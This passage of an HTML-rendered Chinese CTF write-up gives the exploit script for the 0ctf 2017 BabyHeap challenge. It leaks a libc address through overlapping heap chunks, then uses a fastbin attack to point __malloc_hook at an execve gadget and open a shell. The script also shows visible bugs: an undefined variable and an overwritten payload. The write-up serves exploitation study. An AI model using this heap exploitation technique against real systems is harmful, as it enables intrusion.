+    <span class="token keyword">return</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>
+
+<span class="token keyword">def</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+<span class="token comment" spellcheck="true">#    gdb.attach(p)</span>
+    alloc<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">)</span>
+    alloc<span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">)</span>
+    fill<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x60</span> <span class="token operator">+</span> <span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token string">'a'</span> <span class="token operator">*</span> <span class="token number">0x60</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x71</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+    alloc<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span>
+    fill<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token string">'c'</span> <span class="token operator">*</span> <span class="token number">0x10</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x71</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+    free<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
+    alloc<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">)</span>
+    fill<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0x40</span> <span class="token operator">+</span> <span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token string">'b'</span> <span class="token operator">*</span> <span class="token number">0x40</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x111</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+    alloc<span class="token punctuation">(</span><span class="token number">0x50</span><span class="token punctuation">)</span>
+    free<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>
+    leaked <span class="token operator">=</span> u64<span class="token punctuation">(</span>dump<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+    <span class="token comment" spellcheck="true"># return libc_base</span>
+    <span class="token keyword">return</span> leaked <span class="token operator">-</span> <span class="token number">0x3c4b78</span>
+
+
+<span class="token keyword">def</span> <span class="token function">fastbin_attack</span><span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    malloc_hook <span class="token operator">=</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'__malloc_hook'</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_base
+    execve_addr <span class="token operator">=</span> <span class="token number">0x4526a</span> <span class="token operator">+</span> libc_base
+
+    log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"malloc_hook @"</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>malloc_hook<span class="token punctuation">)</span><span class="token punctuation">)</span>
+    log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"system_addr @"</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
+    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>p<span class="token punctuation">)</span>
+    free<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
+    payload <span class="token operator">=</span> <span class="token string">'a'</span> <span class="token operator">*</span> <span class="token number">0x60</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x71</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>malloc_hook <span class="token operator">-</span> <span class="token number">27</span> <span class="token operator">-</span> <span class="token number">0x8</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
+    fill<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x60</span> <span class="token operator">+</span> <span class="token number">0x10</span> <span class="token operator">+</span> <span class="token number">0x10</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>
+
+    alloc<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">)</span>
+    alloc<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">)</span>
+
+    payload  <span class="token operator">=</span> p8<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">3</span>
+    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">2</span>
+    payload  <span class="token operator">=</span> p64<span class="token punctuation">(</span>execve_addr<span class="token punctuation">)</span>
+    fill<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> len<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>
+    alloc<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+<span class="token comment" spellcheck="true">#    pwnlib.gdb.attach(p)</span>
+    libc_base <span class="token operator">=</span> leak<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"get libc_base:"</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span>
+    fastbin_attack<span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span>
+    p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
+    main<span class="token punctuation">(</span><span class="token punctuation">)</span>
+</pre><h3 class="mume-header" id="%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99">参考资料</h3>
+
+<ol>
+<li><a href="http://blog.csdn.net/qq_29343201/article/details/66476135">0ctf 2017 babyheap writeup</a>(exp有问题)</li>
+<li><a href="https://bbs.pediy.com/thread-223461.htm">gd表哥的babyheap</a></li>
+</ol>
+
+      </div>
+      <div class="md-sidebar-toc"><ul>
+<li><a href="#0ctf-2017-babyheap">0ctf 2017 BabyHeap</a>
+<ul>
+<li><a href="#1-%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90">1. 题目分析</a></li>
+<li><a href="#2-%E7%A8%8B%E5%BA%8F%E8%BF%90%E8%A1%8C">2. 程序运行</a></li>
+<li><a href="#3-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%80%9F%E9%89%B4%E8%87%AAgd%E5%B8%88%E5%82%85%E7%9A%84%E7%9C%8B%E9%9B%AA%E4%B8%93%E6%A0%8Fhttpsbbspediycomthread-223461htm">3. 漏洞分析（借鉴自gd师傅的看雪专栏）</a>
+<ul>
+<li><a href="#one-part">One Part</a></li>
+<li><a href="#two-part">Two Part</a></li>
+</ul>
+</li>
+<li><a href="#%E5%85%B6%E4%BB%96%E9%97%AE%E9%A2%98">其他问题:</a></li>
+<li><a href="#exp">EXP</a></li>
+<li><a href="#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99">参考资料</a></li>
+</ul>
+</li>
+</ul>
+</div>
+      <a id="sidebar-toc-btn">≡</a>
+    </body>
+    
+    
+    
+    
+    
+    <script>
+(function bindTaskListEvent() {
+  var taskListItemCheckboxes = document.body.getElementsByClassName('task-list-item-checkbox')
+  for (var i = 0; i < taskListItemCheckboxes.length; i++) {
+    var checkbox = taskListItemCheckboxes[i]
+    var li = checkbox.parentElement
+    if (li.tagName !== 'LI') li = li.parentElement
+    if (li.tagName === 'LI') {
+      li.classList.add('task-list-item')
+    }
+  }
+}())    
+</script>
+    
+<script>
+
+var sidebarTOCBtn = document.getElementById('sidebar-toc-btn')
+sidebarTOCBtn.addEventListener('click', function(event) {
+  event.stopPropagation()
+  if (document.body.hasAttribute('html-show-sidebar-toc')) {
+    document.body.removeAttribute('html-show-sidebar-toc')
+  } else {
+    document.body.setAttribute('html-show-sidebar-toc', true)
+  }
+})
+</script>
+      
+  </html>
